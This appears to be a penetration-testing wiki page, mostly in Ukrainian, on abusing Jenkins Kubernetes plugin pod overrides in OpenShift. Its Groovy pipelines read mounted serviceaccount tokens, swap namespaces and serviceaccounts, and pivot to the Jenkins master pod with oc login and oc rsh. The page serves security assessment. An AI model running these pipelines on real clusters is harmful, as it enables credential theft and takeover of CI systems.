# Jenkins in Openshift - build pod overrides

**The original author of this page is** [**Fares**](https://www.linkedin.com/in/fares-siala/)

## Kubernetes plugin for Jenkins
Цей плагін в основному відповідає за основні функції Jenkins всередині кластера openshift/kubernetes. Офіційна документація [тут](https://plugins.jenkins.io/kubernetes/)  
Він пропонує кілька функціональностей, таких як можливість для розробників перевизначити деякі стандартні конфігурації поду збірки jenkins.

## Core functionnality

Цей плагін дозволяє розробникам гнучкість при створенні їхнього коду в адекватному середовищі.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: maven
image: maven:3.8.1-jdk-8
command:
- sleep
args:
- 99d
''') {
node(POD_LABEL) {
stage('Get a Maven project') {
git 'https://github.com/jenkinsci/kubernetes-plugin.git'
container('maven') {
stage('Build a Maven project') {
sh 'mvn -B -ntp clean install'
}
}
}
}
}
```
## Деякі зловживання, що використовують переопределення yaml пода

Однак це можна зловживати, щоб використовувати будь-який доступний образ, наприклад Kali Linux, і виконувати довільні команди, використовуючи попередньо встановлені інструменти з цього образу.  
У наведеному нижче прикладі ми можемо ексфільтрувати токен serviceaccount запущеного пода.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: kali
image: myregistry/mykali_image:1.0
command:
- sleep
args:
- 1d
''') {
node(POD_LABEL) {
stage('Evil build') {
container('kali') {
stage('Extract openshift token') {
sh 'cat /run/secrets/kubernetes.io/serviceaccount/token'
}
}
}
}
}
```
Інший синтаксис для досягнення тієї ж мети.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Приклад для перевизначення простору імен поду
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: RANDOM-NAMESPACE
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Ще один приклад, який намагається змонтувати serviceaccount (який може мати більше прав, ніж стандартний, що виконує вашу збірку) на основі його імені. Вам, можливо, потрібно буде спробувати вгадати або перерахувати існуючі serviceaccounts спочатку.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: MY_SERVICE_ACCOUNT
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Така ж техніка застосовується для спроби монтування Secret. Кінцева мета тут - зрозуміти, як налаштувати свій pod build, щоб ефективно здійснити поворот або отримати привілеї.

## Йдемо далі

Як тільки ви звикнете грати з цим, використовуйте свої знання про Jenkins та Kubernetes/Openshift, щоб знайти неправильні налаштування / зловживання.

Запитайте себе наступні питання:

- Який обліковий запис служби використовується для розгортання build pods?
- Які ролі та дозволи він має? Чи може він читати секрети простору імен, в якому я зараз знаходжусь?
- Чи можу я далі перерахувати інші build pods?
- З компрометованого sa, чи можу я виконувати команди на майстер-ноді/pod?
- Чи можу я далі перерахувати кластер, щоб здійснити поворот в інше місце?
- Який SCC застосовується?

Ви можете дізнатися, які команди oc/kubectl видавати [тут](../openshift-basic-information.md) та [тут](../../kubernetes-security/kubernetes-enumeration.md).

### Можливі сценарії privesc/pivoting

Припустимо, що під час вашої оцінки ви виявили, що всі збірки jenkins виконуються в просторі імен під назвою _worker-ns_. Ви з'ясували, що на build pods змонтовано обліковий запис служби за замовчуванням під назвою _default-sa_, однак у нього не так багато дозволів, окрім доступу на читання до деяких ресурсів, але ви змогли ідентифікувати існуючий обліковий запис служби під назвою _master-sa_.
Також припустимо, що у вас встановлена команда oc всередині працюючого контейнера збірки.

З наведеним нижче скриптом збірки ви можете взяти під контроль обліковий запис служби _master-sa_ і далі перерахувати.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: master-sa
containers:
- name: evil
image: random_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
sh 'token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)'
sh 'oc --token=$token whoami'
}
}
}
}
}
}
```
В залежності від вашого доступу, або вам потрібно продовжити вашу атаку з скрипту збірки, або ви можете безпосередньо увійти як цей sa на запущеному кластері:
```bash
oc login --token=$token --server=https://apiserver.com:port
```
Якщо цей sa має достатні дозволи (такі як pod/exec), ви також можете взяти під контроль цілий екземпляр jenkins, виконуючи команди всередині пода вузла майстра, якщо він працює в тій же області імен. Ви можете легко ідентифікувати цей под за його назвою та тим фактом, що він повинен монтувати PVC (постійний об'єм запиту), який використовується для зберігання даних jenkins.
```bash
oc rsh pod_name -c container_name
```
У випадку, якщо под майстер-ноут не працює в тому ж просторі імен, що й робітники, ви можете спробувати подібні атаки, націлюючись на простір імен майстра. Припустимо, він називається _jenkins-master_. Майте на увазі, що serviceAccount master-sa має існувати в просторі імен _jenkins-master_ (і може не існувати в просторі імен _worker-ns_)
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: jenkins-master
spec:
serviceAccount: master-sa
containers:
- name: evil-build
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
